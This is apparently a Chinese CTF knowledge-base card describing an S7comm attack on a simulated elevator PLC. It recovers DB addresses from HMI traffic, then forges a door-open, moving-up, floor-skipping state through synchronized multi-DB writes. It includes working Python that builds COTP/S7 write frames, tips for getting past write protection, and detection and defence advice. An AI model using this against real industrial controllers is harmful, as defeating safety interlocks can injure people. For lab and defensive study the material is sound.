---
id: iot-industrial-s7comm-elevator-multi-db-state-forgery
title: S7comm 多组件 DB 同步写入：伪造电梯开门/上行/跨层异常状态触发 HMI flag
type: scenario
domain: iot
path: iot/industrial
technique: s7comm-elevator-multi-db-state-forgery
aliases:
- ISC1
- 电梯 S7 写入
- S7comm 多 DB 同步
- 门开上行跨层
- HMI 公告板 flag
- COTP/S7 PDU
tags:
- iot
- industrial
- s7comm
- plc
- hmi
- elevator
- state-forgery
- scada
- cotp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:51:10+08:00'
  notes: 已对照原文 §9 ISC1 核对：pcap 还原 DB101 控制/门/楼层/HMI 点位、CR/SETUP 帧、pdu/bit/word/block 构造、5200-5290 多端口同步写、门 OPEN100%+motion UP+楼层 1/3/4/5 触发 HMI flag 均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

从正常 HMI 点击流量的 pcap 中恢复电梯控制器的 S7comm DB 点位（DB101 控制输入、门状态、楼层状态、HMI 显示点），然后通过 ISO-on-TCP/COTP + S7 写请求同步写多个组件 DB：持续把门状态写成 `OPEN 100%`，同时保持 `motion=UP` 并把楼层从 1 跳到 3、4、5，构造“开门仍上行并跨楼层”的异常状态；HMI 的 TUI 公告板随后显示 flag。

## 原理

- **S7comm 协议栈**：S7 PLC 使用 ISO-on-TCP（端口 102 或题目映射端口），先发 COTP Connection Request（`03 00 00 16 11 e0 ...`），收到 Confirm 后发 COTP Setup/Data，再封装 S7 PDU；S7 写变量请求包含参数区（功能码 0x05、传输大小、DB 号、区域 0x84、字节/位地址）和数据区。
- **点位恢复**：正常 HMI 点击会产生写 DB 的流量；从 pcap 中提取每个写请求的 DB 号、字节偏移、位号、值，映射出 DB101 的控制输入、门状态、楼层传感器、HMI 显示等字段。
- **多组件同步**：电梯控制器、门控制器、楼层传感器、HMI 面板可能各有独立 DB/端口（如 5200/5210/.../5290）；只改一个 DB 会被其他组件的状态覆盖或校验拒绝，因此需要按同一时序把相同语义写到所有相关 DB。
- **异常状态**：正常安全逻辑禁止“门开 + 上行 + 跨层”同时成立；攻击者绕过该约束后，HMI 的公告板/诊断页会打印 flag（题目设定）。
- **为什么有效**：PLC 信任来自 HMI/上位机的写请求，未对控制输入做物理互锁/签名；多 DB 写入让 HMI 看到一致但危险的组合。

## 触发条件

- 可访问 S7comm 端口（COTP/S7），且未启用写保护/密码。
- 从流量或 HMI 交互可恢复 DB 点位与端口映射。
- 电梯控制器/门/楼层/HMI 使用多个 DB 或组件，需同步写。
- HMI 在异常状态下显示 flag/公告。

## 利用步骤

1. 抓取正常 HMI 点击流量，提取 S7 写请求的 DB 号、偏移、位号、值，建立点位表。
2. 对每个组件端口建立 COTP 连接（CR + SETUP），确认 S7 通信。
3. 发送门状态写：`OPEN 100%`（对应 DB/位/字）。
4. 发送运动/楼层写：`motion=UP`，楼层依次 1、3、4、5；同步更新所有相关 DB。
5. 保持异常状态若干轮，观察 HMI TUI 公告板；读取 flag。

## PoC

COTP/S7 帧与写入函数（节选）：

```python
CR = bytes.fromhex("0300001611e00000000100c1020100c2020102c0010a")
SETUP = bytes.fromhex("0300001902f08032010000000100080000f0000001000101e0")

def pdu(db, transport, count, byte, bit, data):
    addr = byte * 8 + bit
    param = (b"\x05\x01\x12\x0a\x10" + bytes([transport]) +
             count.to_bytes(2, "big") + db.to_bytes(2, "big") +
             b"\x84" + addr.to_bytes(3, "big"))
    length = 4 + 3 + 10 + len(param) + len(data)
    return (b"\x03\x00" + length.to_bytes(2, "big") +
            b"\x02\xf0\x80\x32\x01\x00\x00" + REF.to_bytes(2, "big") +
            len(param).to_bytes(2, "big") + len(data).to_bytes(2, "big") +
            param + data)

def bit(db, byte, bitno, value):
    return pdu(db, 0x01, 1, byte, bitno, b"\x00\x04\x00\x08" + bytes([1 if value else 0, 0]))

def word(db, byte, value):
    return pdu(db, 0x04, 1, byte, 0, b"\x00\x04\x00\x10" + int(value).to_bytes(2, "little"))

def block(db, byte, values):
    pad = b"\x00" if len(values) % 2 else b""
    return pdu(db, 0x02, len(values), byte, 0,
               b"\x00\x04" + (len(values) * 8).to_bytes(2, "big") + values + pad)

def send_packets(port, packets):
    host = "127.1.0.%d" % (port // 10 - 510)
    sock = socket.socket(); sock.settimeout(1)
    sock.connect(socket.getaddrinfo(host, port)[0][-1])
    sock.send(CR); sock.recv(128)
    sock.send(SETUP); sock.recv(128)
    for packet in packets:
        sock.send(packet); sock.recv(128)
    sock.close()
```

异常状态序列（概念）：

```python
open_state = {
    5200: [block(101, 10, b"\x00"*5), bit(101, 25, 0, 0), bit(101, 26, 0, 0)],
    5220: [bit(103, 4, 0, 0), bit(103, 5, 0, 1)],
    5290: [bit(110, 2, 0, 1), bit(110, 6, 0, 1), word(110, 10, 100)],
    # ...
}
for floor in (1, 3, 4, 5):
    write floor words to DB101/103/105/109/110
    write open_state to all ports
```

## 变体与关联

- 其他 OT 协议：Modbus 写寄存器、IEC 104 总召唤/遥控、OPC UA 写节点；核心是“多组件状态一致性 + 物理互锁缺失”。
- 若 PLC 有写保护，可先找 HMI/工程师站凭据、重放会话、利用未授权写功能码。
- 若无 HMI flag 回显，可通过改变传感器/执行器状态观察物理/日志副作用。
- 关联：Modbus 隐蔽信道、IEC 104 未授权主站、工控协议写操作卡。

## 检测与防御

- PLC 启用写保护/密码、最小权限，HMI 与控制网隔离；对关键 DB 写做白名单与范围校验。
- 在 PLC/HMI 层实现物理互锁：门开禁止上行、跨层需门关；不要只依赖上位机。
- 网络层：工控协议深度解析，检测异常多 DB 同步写、门/运动/楼层组合、短时间高频写。
- 检测：同一源在多个端口/DB 写入相同语义值；门开 + 运动 + 楼层跳变；S7 功能码 0x05 写请求异常。
